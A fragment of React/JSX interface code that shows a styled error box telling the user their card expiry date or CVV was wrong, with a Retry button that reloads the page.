    ...
    <div className="w-full max-w-md mx-auto space-y-4 relative p-2 -mb-8 font-chevin font-thin">
      <div className="text-center">
        ...
        <div className="mb-4 mt-6 py-1 px-4 bg-card/80 backdrop-blur-sm border border-border/50 rounded-xl shadow-lg drop-shadow-md">
          <div className="text-center">
            <p className="text-[11px] font-chevin font-medium text-muted-foreground leading-relaxed drop-shadow-sm">
              You have entered incorrect expiry date or cvv details.<br />
              Please retry with correct information.
            </p>
            <Button
              onClick={() => window.location.reload()}
              className="mt-3 mb-2 !h-auto !py-0.5 px-2 text-[10px] bg-blue-600 text-white hover:bg-blue-700 active:scale-95 transform transition-all duration-200 ease-in-out shadow-2xl hover:shadow-2xl active:shadow-lg drop-shadow-lg"
            >
              Retry
            </Button>
          </div>
